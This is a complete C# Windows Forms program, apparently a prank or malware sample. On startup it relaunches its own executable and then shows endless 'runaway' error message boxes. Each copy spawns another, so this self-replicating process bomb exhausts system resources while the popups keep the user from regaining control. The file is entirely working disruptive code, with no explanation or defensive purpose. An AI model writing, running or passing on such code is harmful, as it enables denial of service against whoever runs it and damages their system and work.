using System.Windows.Forms;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace _000
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            string ExePath = Application.ExecutablePath;
            System.Diagnostics.Process.Start(ExePath);
            while (true)
            {
                MessageBox.Show("runaway", "runaway", MessageBoxButtons.OK, MessageBoxIcon.Error)   ;
            }
        }
    }
}